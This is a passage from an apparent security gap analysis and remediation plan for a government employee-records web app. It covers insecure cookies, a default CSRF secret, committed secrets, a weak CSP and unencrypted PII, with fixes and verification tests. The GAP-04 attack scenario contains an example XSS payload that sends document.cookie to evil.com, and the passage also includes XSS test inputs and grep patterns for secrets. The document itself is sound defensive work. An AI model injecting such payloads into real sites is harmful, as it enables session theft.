|---------|-----------|----------------|
| DETECT-01.1 | Login from new IP address | Suspicious activity logged, no user-facing alert (silent detection) |
| DETECT-01.2 | Login from new device/browser | Device fingerprint change detected and logged |

---

# 13. Security Gap Analysis and Remediation Plan

## 13.1 Gap Severity Classification

| Severity | Risk Score | Definition | Response SLA |
|----------|-----------|------------|-------------|
| **Critical** | 9.0-10.0 | Allows system compromise, data breach, or authentication bypass | Immediate (24 hours) |
| **High** | 7.0-8.9 | Significant security impact, potential data exposure or privilege escalation | 48 hours |
| **Medium** | 4.0-6.9 | Moderate security impact, requires specific conditions to exploit | 7 days |
| **Low** | 0.1-3.9 | Minor security issue, limited impact, defense-in-depth improvement | 30 days |

## 13.2 Gap Register

| Gap ID | Severity | Description | Location | Impact |
|--------|----------|-------------|----------|--------|
| GAP-01 | **Critical** | Auth cookie (`auth-storage`) lacks `httpOnly` and `Secure` flags | `src/store/auth-store.ts:40` | Cookie readable by JavaScript; sent over HTTP in non-production |
| GAP-02 | **Critical** | Default CSRF secret in `.env` | `src/lib/csrf-utils.ts:19`, `.env` | Token forgery possible if secret unchanged |
| GAP-03 | **Critical** | Secrets in `.env` file committed to repository | `.env` | Database credentials, API keys, SMTP password in plaintext VCS |
| GAP-04 | **High** | CSP uses `'unsafe-inline'` and `'unsafe-eval'` | `next.config.ts:57-71` | Weakens XSS protection |
| GAP-05 | **High** | No encryption at rest for PII fields | Database schema | ZAN ID, phone, email, DOB stored unencrypted |
| GAP-06 | **High** | Duplicate RBAC configuration | `middleware.ts:78-205` vs `src/lib/route-permissions.ts:20-167` | Permission drift risk; two independently maintained copies |
| GAP-07 | **High** | npm audit: HIGH severity in genkit deps | `package.json` | Transitive vulnerabilities in genkit ecosystem (no fix available) |
| GAP-08 | **Medium** | MinIO credentials logged at startup | `src/lib/minio.ts:11-18` | Access key visible in logs |
| GAP-09 | **Medium** | MFA bypass for users without email | `login/route.ts:284` | Users without email address skip MFA entirely |
| GAP-10 | **Medium** | JIT default password = ZAN ID (predictable) | `employee-login/route.ts:121` | Initial password predictable if ZAN ID known |
| GAP-11 | **Medium** | Audit logging fire-and-forget (`.catch(() => {})`) | `audit-logger.ts:132-137` | Audit failures silently swallowed; monitoring blind spot |
| GAP-12 | **Low** | No CSP reporting endpoint | `next.config.ts:57-71` | CSP violations not collected for monitoring |
| GAP-13 | **Low** | No Subresource Integrity (SRI) | External CDN scripts | CDN compromise could alter scripts without detection |
| GAP-14 | **Low** | SMTP `rejectUnauthorized: false` | `src/lib/email.ts:32` | Accepts self-signed TLS certs for email |
| GAP-15 | **Low** | No request body size limit configured | Next.js config | Potential DoS via oversized request bodies |

---

## 13.3 Detailed Gap Analysis and Remediation Procedures

---

### GAP-01: Auth Cookie Missing httpOnly and Secure Flags

**Severity:** Critical
**CVSS Score:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)
**OWASP Mapping:** A02:2021 - Cryptographic Failures, A05:2021 - Security Misconfiguration

#### Current State

The `auth-storage` cookie is set client-side via `document.cookie` in the Zustand auth store (`src/store/auth-store.ts:40`):

```javascript
document.cookie = `auth-storage=${encodeURIComponent(cookieValue)}; path=/; expires=${expiryDate.toUTCString()}; SameSite=Strict`;
```

The cookie contains serialized user authentication state including `userId`, `role`, `username`, and `institutionId`. Because it is set via client-side JavaScript:

1. **No `httpOnly` flag** — The cookie is readable by any JavaScript running on the page. If an XSS vulnerability exists, an attacker can read the cookie and extract the full auth state.
2. **No `Secure` flag** — The cookie can be transmitted over unencrypted HTTP connections, exposing it to network interception (MITM attacks).
3. **No `__Host-` prefix** — The cookie lacks the `__Host-` prefix which would enforce `Secure`, `Path=/`, and no `Domain` attribute.

#### Attack Scenario

1. An attacker discovers a stored XSS vulnerability in a user-facing field (e.g., complaint text, employee notes).
2. The attacker injects a script that reads `document.cookie` and exfiltrates the `auth-storage` value.
3. The attacker reconstructs the auth state and impersonates the victim, gaining their role and institution access.
4. Since the cookie has no `httpOnly` flag, the attack succeeds without needing to bypass any cookie-level protection.

#### Remediation Steps

**Step 1: Move cookie setting to server-side**

Replace the client-side `setAuthCookie()` function with a server-side cookie set during login response. In `src/app/api/auth/login/route.ts`, after successful authentication, set the cookie in the response:

```typescript
// In login route.ts, after successful auth:
const response = NextResponse.json({ success: true, data: authData });
response.cookies.set('auth-storage', JSON.stringify({
  userId: user.id,
  role: user.role,
  username: user.username,
  institutionId: user.institutionId,
}), {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'strict',
  path: '/',
  maxAge: 60 * 60 * 24 * 7, // 7 days
});
return response;
```

**Step 2: Update middleware to read the new cookie format**

In `middleware.ts`, update the cookie parsing to handle the new format (no longer nested under `state.user`):

```typescript
// middleware.ts — update cookie parsing
const parsed = JSON.parse(decoded);
// New format: { userId, role, username, institutionId }
// Old format: { state: { user: { id, role, ... } } }
const userId = parsed.userId || parsed.state?.user?.id;
const role = parsed.role || parsed.state?.user?.role || parsed.state?.role;
```

**Step 3: Remove client-side cookie setting**

In `src/store/auth-store.ts`, remove the `setAuthCookie()` and `clearAuthCookie()` functions. The cookie will now be managed entirely by the server.

**Step 4: Add a `/api/auth/session` endpoint**

Create an endpoint that returns the current session state from the server-side cookie, so the client can hydrate its Zustand store on page load:

```typescript
// src/app/api/auth/session/route.ts
export async function GET(request: NextRequest) {
  const cookie = request.cookies.get('auth-storage');
  if (!cookie) return NextResponse.json({ authenticated: false }, { status: 401 });
  try {
    const data = JSON.parse(cookie.value);
    return NextResponse.json({ authenticated: true, ...data });
  } catch {
    return NextResponse.json({ authenticated: false }, { status: 401 });
  }
}
```

**Step 5: Update client initialization**

In `src/store/auth-store.ts`, update `initializeAuth()` to call `/api/auth/session` instead of reading from localStorage.

#### Verification

| Test ID | Test | Expected Result |
|---------|------|----------------|
| GAP-01.V1 | Inspect `auth-storage` cookie in browser DevTools | `HttpOnly: true`, `Secure: true` (in production), `SameSite: Strict` |
| GAP-01.V2 | Attempt `document.cookie` in browser console | `auth-storage` cookie NOT visible |
| GAP-01.V3 | Access site via HTTP (non-HTTPS) | Cookie NOT sent (Secure flag enforced) |
| GAP-01.V4 | Login and verify session persists across page reloads | Session maintained via server-set cookie |
| GAP-01.V5 | XSS payload attempting to read auth cookie | Cookie inaccessible via JavaScript |

#### Rollback Plan

If the server-side cookie approach causes issues:
1. Revert to the client-side `document.cookie` approach temporarily.
2. Add `Secure` flag to the client-side cookie as an interim measure.
3. Document the residual risk and set a timeline for re-implementing the server-side approach.

---

### GAP-02: Default CSRF Secret

**Severity:** Critical
**CVSS Score:** 9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
**OWASP Mapping:** A02:2021 - Cryptographic Failures

#### Current State

The CSRF token signing secret is defined in `src/lib/csrf-utils.ts:19`:

```typescript
export const CSRF_SECRET_ENV =
  process.env.CSRF_SECRET || 'default-csrf-secret-change-in-production';
```

The `.env` file contains:
```
CSRF_SECRET=your-secret-csrf-key-change-in-production
```

Both the hardcoded fallback and the `.env` value are publicly known defaults. An attacker who knows the secret can forge valid CSRF tokens, completely bypassing CSRF protection.

#### Attack Scenario

1. Attacker identifies the application uses the default CSRF secret (either by reading the public source code or by testing token signatures).
2. Attacker crafts a malicious form on an external site that targets a state-changing endpoint (e.g., password change, role modification).
3. Attacker generates a valid CSRF token signed with the known default secret.
4. Victim visits the attacker's site while authenticated to CSMS.
5. The form auto-submits with a valid CSRF token, and the server accepts the request as legitimate.

#### Remediation Steps

**Step 1: Generate a cryptographically secure secret**

```bash
node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"
```

This produces a 128-character hex string (512 bits of entropy).

**Step 2: Update the `.env` file**

Replace the default value:
```bash
# Before
CSRF_SECRET=your-secret-csrf-key-change-in-production

# After
CSRF_SECRET=<generated-64-byte-hex-value>
```

**Step 3: Remove the hardcoded fallback**

In `src/lib/csrf-utils.ts:19`, change from:
```typescript
export const CSRF_SECRET_ENV =
  process.env.CSRF_SECRET || 'default-csrf-secret-change-in-production';
```
To:
```typescript
const CSRF_SECRET = process.env.CSRF_SECRET;
if (!CSRF_SECRET) {
  throw new Error('CRITICAL: CSRF_SECRET environment variable is not set. Application cannot start securely.');
}
export const CSRF_SECRET_ENV = CSRF_SECRET;
```

This ensures the application fails to start if the secret is not configured, preventing accidental deployment with a default secret.

**Step 4: Rotate the secret on all environments**

Update the CSRF_SECRET value in:
- Production `.env`
- Staging/UAT `.env`
- CI/CD pipeline environment variables
- Any deployment configuration (PM2 ecosystem file, Docker Compose, etc.)

**Step 5: Invalidate existing tokens**

After changing the secret, all existing CSRF tokens become invalid. Users will receive new tokens on their next login. No additional action is needed since tokens are regenerated on each login.

#### Verification

| Test ID | Test | Expected Result |
|---------|------|----------------|
| GAP-02.V1 | Check `CSRF_SECRET` in production `.env` | Value is a 128-character hex string, not the default |
| GAP-02.V2 | Attempt to start app without `CSRF_SECRET` set | Application fails to start with clear error message |
| GAP-02.V3 | Forge a CSRF token using the old default secret | Token rejected (signature mismatch) |
| GAP-02.V4 | Verify token generation with new secret | Tokens generated and validated successfully |

#### Rollback Plan

1. Keep a backup of the old `.env` file before making changes.
2. If token validation fails after rotation, verify the secret is correctly set in all deployment locations.
3. All users will need to re-login after rotation (tokens are regenerated on login).

---

### GAP-03: Secrets in Version-Controlled .env File

**Severity:** Critical
**CVSS Score:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
**OWASP Mapping:** A05:2021 - Security Misconfiguration, A02:2021 - Cryptographic Failures

#### Current State

The `.env` file at the repository root contains plaintext secrets and is tracked by Git:

| Secret | Value Type | Risk if Exposed |
|--------|-----------|----------------|
| `DATABASE_URL` | PostgreSQL connection string with password | Full database access |
| `MINIO_ACCESS_KEY` / `MINIO_SECRET_KEY` | Object storage credentials | All files readable/writable |
| `SMTP_PASSWORD` | Email server password | Email spoofing, phishing |
| `GEMINI_API_KEY` | Google AI API key | API abuse, cost incurred |
| `OLLAMA_API_KEY` | LLM API key | API abuse |
| `CSRF_SECRET` | CSRF signing key | CSRF bypass |
| `JWT_SECRET` | JWT signing key (if used) | Token forgery |

Anyone with access to the Git repository (developers, contractors, or an attacker who gains repository access) can read all these secrets.

#### Attack Scenario

1. A developer's laptop is compromised, or a contractor with repository access acts maliciously.
2. The attacker clones the repository and reads `.env` to obtain production database credentials.
3. The attacker connects directly to the production PostgreSQL database and exfiltrates all employee PII, user credentials, and audit logs.
4. Alternatively, the attacker uses the SMTP credentials to send phishing emails appearing to come from the official CSMS system.

#### Remediation Steps

**Step 1: Add `.env` to `.gitignore`**

```bash
echo ".env" >> .gitignore
echo ".env.local" >> .gitignore
echo ".env.*.local" >> .gitignore
```

**Step 2: Remove `.env` from Git tracking (without deleting the file)**

```bash
git rm --cached .env
git rm --cached .env.local  # if tracked
git commit -m "security: remove .env files from version control"
```

**Step 3: Create a `.env.example` template**

Create `.env.example` with placeholder values (no real secrets):

```bash
# Database
DATABASE_URL=postgresql://USER:PASSWORD@HOST:5432/nody

# MinIO Object Storage
MINIO_ACCESS_KEY=minioadmin
MINIO_SECRET_KEY=change-me
MINIO_ENDPOINT=localhost
MINIO_PORT=9000

# SMTP Email
SMTP_HOST=smtp.example.com
SMTP_PORT=587
SMTP_USER=noreply@example.com
SMTP_PASSWORD=change-me

# CSRF Protection
CSRF_SECRET=generate-with-node-crypto-randomBytes-64-hex

# Other secrets — see operations manual for full list
```

**Step 4: Rotate all exposed secrets**

Since the secrets have been in the Git history, they must be rotated:

| Secret | Rotation Procedure |
|--------|-------------------|
| Database password | `ALTER USER csms_user WITH PASSWORD 'new-password';` then update DATABASE_URL |
| MinIO credentials | Use MinIO Console or `mc admin user add` to create new keys, update `.env`, delete old keys |
| SMTP password | Change password on mail server, update `.env` |
| API keys (Gemini, Ollama) | Regenerate in respective consoles, update `.env` |
| CSRF_SECRET | Generate new value (see GAP-02), update `.env` |

**Step 5: Implement a secrets management solution**

For production, use one of:
- **HashiCorp Vault** (recommended for on-premise)
- **Environment variables set at deployment** (PM2 ecosystem file, systemd service file)
- **Docker secrets** (if using Docker)
- **CI/CD encrypted variables** (GitHub Actions secrets, GitLab CI variables)

**Step 6: Scan Git history for other exposed secrets**

```bash
# Use git-secrets or truffleHog to scan history
git log -p | grep -i "password\|secret\|key\|token" | grep -v "example\|placeholder\|change-me"
```

If secrets are found in commit history, consider using `git filter-branch` or `BFG Repo-Cleaner` to purge them, then force-push (with team coordination).

#### Verification

| Test ID | Test | Expected Result |
|---------|------|----------------|
| GAP-03.V1 | Check `.gitignore` | `.env` is listed |
| GAP-03.V2 | Run `git ls-files .env` | File is NOT tracked |
| GAP-03.V3 | Clone repo fresh and run `ls -la` | `.env` file absent, `.env.example` present |
| GAP-03.V4 | Verify old secrets don't work | Rotated credentials are in effect; old credentials fail |
| GAP-03.V5 | Scan git history for secrets | No plaintext passwords/keys in recent commits |

#### Rollback Plan

1. The `.env` file remains on disk locally (only removed from Git tracking).
2. If rotation causes issues, old credentials can be temporarily restored while troubleshooting.
3. Keep a secure offline backup of the original `.env` until rotation is verified.

---

### GAP-04: CSP Uses 'unsafe-inline' and 'unsafe-eval'

**Severity:** High
**CVSS Score:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
**OWASP Mapping:** A05:2021 - Security Misconfiguration

#### Current State

The Content Security Policy in `next.config.ts:57-71` includes:

```
script-src 'self' 'unsafe-eval' 'unsafe-inline' https://accounts.google.com https://www.gstatic.com;
style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
```

- `'unsafe-inline'` allows inline `<script>` tags and `onclick`/`onerror` event handlers, which are the primary vector for XSS attacks.
- `'unsafe-eval'` allows `eval()`, `new Function()`, and similar dynamic code execution, which can be used to execute attacker-controlled strings.

#### Attack Scenario

1. An attacker finds a stored XSS vulnerability in a user input field.
2. With `'unsafe-inline'` enabled, the attacker can inject `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>` and it executes directly.
3. Without `'unsafe-inline'`, the same injection would be blocked by CSP even if the XSS vulnerability exists in the application code.

#### Why It Exists

Next.js uses inline scripts for its runtime (chunk loading, hydration). Removing `'unsafe-inline'` breaks Next.js functionality. This is a known trade-off in the Next.js ecosystem.

#### Remediation Steps

**Step 1: Enable strict CSP with nonces in Next.js**

Next.js supports nonce-based CSP via the `next/headers` API. In `middleware.ts` or a custom `generateCsp` function:

```typescript
// src/lib/csp.ts
import { headers } from 'next/headers';
import crypto from 'crypto';

export function generateNonce(): string {
  return crypto.randomBytes(16).toString('base64');
}

export function getCspHeaders(nonce: string): Record<string, string> {
  const csp = [
    `default-src 'self'`,
    `script-src 'self' 'nonce-${nonce}' https://accounts.google.com https://www.gstatic.com`,
    `style-src 'self' 'nonce-${nonce}' https://fonts.googleapis.com`,
    `font-src 'self' https://fonts.gstatic.com data:`,
    `img-src 'self' data: https: blob:`,
    `media-src 'self' data: blob:`,
    `connect-src 'self' https://generativelanguage.googleapis.com https://accounts.google.com`,
    `frame-src 'self' https://accounts.google.com`,
    `object-src 'none'`,
    `base-uri 'self'`,
    `form-action 'self'`,
    `frame-ancestors 'self'`,
    `upgrade-insecure-requests`,
  ].join('; ');

  return { 'Content-Security-Policy': csp };
}
```

**Step 2: Apply nonce to Next.js Script component**

In `src/app/layout.tsx`:

```typescript
import { generateNonce } from '@/lib/csp';

export default function RootLayout({ children }) {
  const nonce = generateNonce();
  // Store nonce in headers for CSP
  headers().set('x-nonce', nonce);

  return (
    <html>
      <head>
        <Script nonce={nonce} ... />
      </head>
      <body>{children}</body>
    </html>
  );
}
```

**Step 3: Test incrementally**

1. First, add `report-uri` or `report-to` directive to collect CSP violation reports without blocking.
2. Deploy with `Content-Security-Policy-Report-Only` header to monitor violations.
3. Analyze reports for 1-2 weeks to identify all legitimate inline scripts.
4. Address violations (move inline scripts to external files with nonces).
5. Switch to enforcing `Content-Security-Policy` header.

**Step 4: Fallback approach — hash-based CSP**

If nonces are incompatible with Next.js caching, use hash-based CSP:

1. Identify all inline scripts in the built output.
2. Compute SHA-256 hashes for each.
3. Add hashes to CSP: `script-src 'self' 'sha256-abc123...' 'sha256-def456...'`.
4. This is more brittle (hashes change on every build) but doesn't require nonce plumbing.

#### Verification

| Test ID | Test | Expected Result |
|---------|------|----------------|
| GAP-04.V1 | Check CSP header in production | No `'unsafe-inline'` or `'unsafe-eval'` in script-src |
| GAP-04.V2 | Inject `<script>alert(1)</script>` via input field | Script blocked by CSP (report in console) |
| GAP-04.V3 | Verify Next.js functionality | Pages load, hydration works, no CSP errors in console |
| GAP-04.V4 | Check CSP violation reports | Reports being collected, no unexpected violations |

#### Rollback Plan

1. Revert to `'unsafe-inline'` and `'unsafe-eval'` if nonce approach breaks production.
2. Document the accepted risk with a timeline for re-attempting.
3. Compensate with stronger input validation and output encoding as defense-in-depth.

---

### GAP-05: No Encryption at Rest for PII Fields

**Severity:** High
**CVSS Score:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
**OWASP Mapping:** A02:2021 - Cryptographic Failures, A04:2021 - Insecure Design

#### Current State

The Employee model in the Prisma schema stores personally identifiable information (PII) as plaintext in the PostgreSQL database:

| Field | PII Type | Sensitivity |
|-------|----------|-------------|
| `zanId` | National ID number | High — identity theft risk |
| `phoneNumber` | Personal phone | Medium — contact privacy |
| `email` | Personal email | Medium — contact privacy |
| `dateOfBirth` | Birth date | Medium — identity verification |
| `zssfNumber` | Social security number | High — financial identity |
| `payrollNumber` | Payroll ID | Medium — financial privacy |
| `contactAddress` | Physical address | Medium — location privacy |

If an attacker gains database access (e.g., via SQL injection, compromised backup, or insider threat), all employee PII is immediately readable.

#### Attack Scenario

1. An attacker obtains a database backup file that was stored without encryption.
2. The backup contains the full `Employee` table with plaintext ZAN IDs, phone numbers, addresses, and birth dates for all civil servants.
3. The attacker sells or publishes this data, resulting in a data breach affecting thousands of government employees.

#### Remediation Steps

**Step 1: Enable PostgreSQL encryption at rest**

For the database server itself, enable filesystem-level encryption:
- **Linux:** Use LUKS (Linux Unified Key Setup) for disk encryption
- **Cloud:** Enable provider-managed encryption (AWS RDS encryption, Azure TDE)

```bash
# Example: Check if PostgreSQL data directory is on encrypted volume
lsblk -o NAME,MOUNTPOINT,FSTYPE,TYPE,MOUNTPOINT | grep postgres
```

**Step 2: Implement field-level encryption using pgcrypto**

Install the pgcrypto extension in PostgreSQL:

```sql
CREATE EXTENSION IF NOT EXISTS pgcrypto;
```

Create encryption/decryption functions:

```sql
-- Encryption function using AES-256
CREATE OR REPLACE FUNCTION encrypt_pii(plaintext text) RETURNS text AS $$
BEGIN
  RETURN encode(
    pgp_sym_encrypt(
      plaintext,
      current_setting('app.encryption_key')
    ),
    'base64'
  );
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- Decryption function
CREATE OR REPLACE FUNCTION decrypt_pii(ciphertext text) RETURNS text AS $$
BEGIN
  RETURN pgp_sym_decrypt(
    decode(ciphertext, 'base64'),
    current_setting('app.encryption_key')
  );
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
```

**Step 3: Add encrypted columns via Prisma migration**

Add parallel encrypted columns for each sensitive field:

```sql
ALTER TABLE "Employee" ADD COLUMN "zanIdEncrypted" TEXT;
ALTER TABLE "Employee" ADD COLUMN "phoneNumberEncrypted" TEXT;
ALTER TABLE "Employee" ADD COLUMN "emailEncrypted" TEXT;
ALTER TABLE "Employee" ADD COLUMN "dateOfBirthEncrypted" TEXT;
ALTER TABLE "Employee" ADD COLUMN "zssfNumberEncrypted" TEXT;
ALTER TABLE "Employee" ADD COLUMN "payrollNumberEncrypted" TEXT;
ALTER TABLE "Employee" ADD COLUMN "contactAddressEncrypted" TEXT;
```

**Step 4: Migrate existing data**

```sql
UPDATE "Employee" SET
  "zanIdEncrypted" = encrypt_pii("zanId"),
  "phoneNumberEncrypted" = encrypt_pii("phoneNumber"),
  "emailEncrypted" = encrypt_pii("email"),
  "dateOfBirthEncrypted" = encrypt_pii("dateOfBirth"),
  "zssfNumberEncrypted" = encrypt_pii("zssfNumber"),
  "payrollNumberEncrypted" = encrypt_pii("payrollNumber"),
  "contactAddressEncrypted" = encrypt_pii("contactAddress");
```

**Step 5: Update application code to use encrypted columns**

Modify Prisma queries to select encrypted columns and decrypt in the application layer, or use PostgreSQL views that handle decryption transparently.

**Step 6: Drop plaintext columns (after verification)**

```sql
-- Only after verifying all reads/writes use encrypted columns
ALTER TABLE "Employee" DROP COLUMN "zanId";
ALTER TABLE "Employee" DROP COLUMN "phoneNumber";
-- ... etc.
```

**Step 7: Secure the encryption key**

Store the encryption key separately from the database:
- Use HashiCorp Vault or a hardware security module (HSM)
- Set as an environment variable on the application server (not in the database)
- Rotate keys periodically (every 90 days)

#### Verification

| Test ID | Test | Expected Result |
|---------|------|----------------|
| GAP-05.V1 | Query Employee table directly | PII columns contain encrypted (base64) data, not plaintext |
| GAP-05.V2 | Access employee via application | PII displays correctly (decrypted transparently) |
| GAP-05.V3 | Search by ZAN ID | Search works (use deterministic encryption or indexed hash) |
| GAP-05.V4 | Database backup inspection | Backup contains only encrypted PII values |
| GAP-05.V5 | Performance benchmark | Query performance within acceptable range (encryption overhead < 10%) |

#### Rollback Plan

1. Keep plaintext columns during migration period (run both in parallel).
2. If decryption fails, fall back to plaintext columns.
3. Only drop plaintext columns after a full UAT cycle with encrypted columns.

---

### GAP-06: Duplicate RBAC Configuration

**Severity:** High
**CVSS Score:** 7.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H)
**OWASP Mapping:** A01:2021 - Broken Access Control

#### Current State

The route permission matrix is defined independently in two files:

1. **`middleware.ts:78-205`** — Used for server-side page access control before rendering.
2. **`src/lib/route-permissions.ts:20-167`** — Used for client-side route guards and API-level checks.

Both files contain the same logical permission data but are maintained separately. If a developer updates one but forgets the other, the permissions diverge, creating either:
- **False positives:** Middleware blocks a route that the client guard allows (user sees a broken page).
- **False negatives:** Middleware allows a route that the client guard blocks (user bypasses client check, but API still enforces — inconsistent UX).

#### Attack Scenario

1. A new feature adds a route `/dashboard/sensitive-reports` that should be Admin-only.
2. Developer adds the permission to `route-permissions.ts` (client-side) but forgets `middleware.ts`.
3. The client-side guard blocks non-admin users from seeing the navigation link.
4. However, a non-admin user who knows the URL can navigate directly to `/dashboard/sensitive-reports` because the middleware doesn't block it.
5. The API still enforces authorization, but the user can see the page shell and potentially infer sensitive information from error messages or loading states.

#### Remediation Steps

**Step 1: Extract shared permission configuration**

Create a new file `src/lib/route-permissions-config.ts` that contains ONLY the permission data (no logic):

```typescript
// src/lib/route-permissions-config.ts
import { ROLES } from './constants';
import type { Role } from './types';

export interface RoutePermission {
  pattern: string | RegExp;
  allowedRoles: Role[];
  description?: string;
}

export const ROUTE_PERMISSIONS: RoutePermission[] = [
  {
    pattern: /^\/dashboard\/admin/,
    allowedRoles: [ROLES.ADMIN as Role],
    description: 'Admin management pages',
  },
  {
    pattern: '/dashboard/confirmation',
    allowedRoles: [ROLES.HRO, ROLES.HHRMD, ROLES.HRMO, ROLES.CSCS, ROLES.HRRP],
    description: 'Employee confirmation',
  },
  // ... all other permissions
];
```

**Step 2: Update middleware.ts to import shared config**

```typescript
// middleware.ts
import { ROUTE_PERMISSIONS } from '@/lib/route-permissions-config';

// Remove the inline ROUTE_PERMISSIONS array
// Remove the inline Role type and ROLES constant
// Use the imported ROUTE_PERMISSIONS directly
```

**Step 3: Update route-permissions.ts to re-export from shared config**

```typescript
// src/lib/route-permissions.ts
import { ROUTE_PERMISSIONS, type RoutePermission } from './route-permissions-config';

// Re-export for backward compatibility
export { ROUTE_PERMISSIONS, type RoutePermission };

// Keep the helper functions (canAccessRoute, getAllowedRolesForRoute)
// These operate on the shared ROUTE_PERMISSIONS array
```

**Step 4: Add a CI check to prevent duplication**

Add a test that verifies the middleware and route-permissions.ts use the same source:

```typescript
// __tests__/security/rbac-consistency.test.ts
import { ROUTE_PERMISSIONS as sharedPermissions } from '@/lib/route-permissions-config';

test('RBAC configuration is defined in a single source', () => {
  // Verify the shared config is the canonical source
  expect(sharedPermissions).toBeDefined();
  expect(sharedPermissions.length).toBeGreaterThan(0);

  // Verify all patterns are valid
  for (const perm of sharedPermissions) {
    expect(perm.pattern).toBeDefined();
    expect(perm.allowedRoles.length).toBeGreaterThan(0);
  }
});
```

#### Verification

| Test ID | Test | Expected Result |
|---------|------|----------------|
| GAP-06.V1 | Search for `ROUTE_PERMISSIONS` in codebase | Only ONE definition exists (in `route-permissions-config.ts`) |
| GAP-06.V2 | Add a new route permission in shared config | Both middleware and client guard enforce the new permission |
| GAP-06.V3 | CI pipeline runs RBAC consistency test | Test passes, confirming single source of truth |
| GAP-06.V4 | Manual test: access restricted route as unauthorized user | Blocked at middleware level (redirect) AND API level (403) |

#### Rollback Plan

1. Keep the old inline definitions as comments during transition.
2. If the import breaks middleware (Next.js middleware has limited import support), use a shared JSON file or a separate package that both can import.
3. Test middleware imports work in production build (Next.js middleware has restrictions on npm packages).

---

### GAP-07: npm Audit HIGH Severity Vulnerabilities

**Severity:** High
**CVSS Score:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)
**OWASP Mapping:** A06:2021 - Vulnerable and Outdated Components

#### Current State

`npm audit` reports HIGH severity vulnerabilities in the Genkit dependency chain:

| Package | Vulnerability | Fix Available |
|---------|--------------|---------------|
| `@genkit-ai/ai` | Transitive via uuid, @opentelemetry/sdk-node | No |
| `@genkit-ai/core` | Transitive via @google-cloud/firestore | No |
| `@genkit-ai/firebase` | Transitive dependency issues | No |
| `@genkit-ai/google-cloud` | Transitive dependency issues | No |
| `@babel/runtime` (<7.26.10) | ReDoS via inefficient regex (CWE-1333, CVSS 6.2) | Yes (7.26.10) |

#### Attack Scenario

1. The Genkit AI features process user-submitted complaint text for rewriting.
2. A crafted input triggers a ReDoS vulnerability in a transitive dependency, causing the Node.js event loop to block.
3. The application becomes unresponsive, creating a denial-of-service condition.

#### Remediation Steps

**Step 1: Fix fixable vulnerabilities immediately**

```bash
# Fix @babel/runtime (has available fix)
npm update @babel/runtime

# Run audit again to verify
npm audit
```

**Step 2: Assess Genkit exposure**

Determine if the vulnerable Genkit code paths are actually reachable:
- Is the Genkit complaint rewriting feature enabled in production?
- Are the vulnerable transitive dependencies loaded at runtime?
- Can the Genkit packages be isolated to reduce attack surface?

**Step 3: Mitigation options for unfixable vulnerabilities**

| Option | Description | Risk Reduction |
|--------|-------------|---------------|
| A. Remove Genkit | If complaint rewriting is not critical, remove Genkit packages entirely | 100% |
| B. Isolate Genkit | Run Genkit in a separate process/worker with restricted permissions | 80% |
| C. Pin and monitor | Pin current versions, monitor for fixes weekly, apply when available | 20% |
| D. Accept risk | Document and accept with management sign-off | 0% |

**Step 4: Implement automated vulnerability monitoring**

Add to CI/CD pipeline:

```yaml
# .github/workflows/security-audit.yml
name: Security Audit
on:
  schedule:
    - cron: '0 6 * * 1'  # Every Monday at 6 AM
  push:
    branches: [main]
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
      - run: npm ci
      - run: npm audit --audit-level=high
```

**Step 5: Subscribe to security advisories**

- Watch the Genkit GitHub repository for security releases.
- Enable GitHub Dependabot alerts on the repository.
- Subscribe to npm security advisories for the packages in `package.json`.

#### Verification

| Test ID | Test | Expected Result |
|---------|------|----------------|
| GAP-07.V1 | Run `npm audit` | No HIGH or CRITICAL vulnerabilities (or documented exceptions) |
| GAP-07.V2 | Check Dependabot configuration | Dependabot enabled, alerts configured |
| GAP-07.V3 | Review CI pipeline | Security audit step runs on schedule |
| GAP-07.V4 | Test Genkit feature isolation | If isolated, main app functions without Genkit dependencies |

#### Rollback Plan

1. If removing Genkit breaks complaint rewriting, restore the packages and implement Option B (process isolation).
2. Document accepted risk with a sunset date for re-evaluation.

---

### GAP-08: MinIO Credentials Logged at Startup

**Severity:** Medium
**CVSS Score:** 5.5 (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
**OWASP Mapping:** A09:2021 - Security Logging and Monitoring Failures

#### Current State

In `src/lib/minio.ts:11-18`, the MinIO access key is logged in plaintext at application startup:

```typescript
fileLogger.info({
  accessKey,                    // <-- SECRET LOGGED IN PLAINTEXT
  secretKeyConfigured: !!secretKey,
  endPoint,
  port,
  useSSL,
  nodeEnv: process.env.NODE_ENV,
}, 'MinIO credentials check');
```

Anyone with access to application logs can read the MinIO access key, which grants access to all stored files (employee documents, certificates, photos).

#### Attack Scenario

1. A developer or operator with log access (legitimate or compromised) reads the application startup logs.
2. They extract the MinIO access key and secret key.
3. Using these credentials, they access the MinIO server directly and download all employee documents, certificates, and photos.
4. This bypasses all application-level access controls and audit logging.

#### Remediation Steps

**Step 1: Remove credential logging**

In `src/lib/minio.ts:11-18`, change from:

```typescript
fileLogger.info({
  accessKey,
  secretKeyConfigured: !!secretKey,
  endPoint,
  port,
  useSSL,
  nodeEnv: process.env.NODE_ENV,
}, 'MinIO credentials check');
```

To:

```typescript
fileLogger.info({
  endPoint,
  port,
  useSSL,
  minioConfigured: !!(process.env.MINIO_ACCESS_KEY && process.env.MINIO_SECRET_KEY),
}, 'MinIO client initialized');
```

**Step 2: Audit all startup logging for credential leaks**

Search the codebase for other instances of credentials in log statements:

```bash
grep -rn "logger\." src/ | grep -i "secret\|password\|key\|token\|credential"
```

**Step 3: Add a pre-commit hook to prevent future leaks**

Add to `.husky/pre-commit` or lint-staged configuration:

```bash
# Block commits that log potential secrets
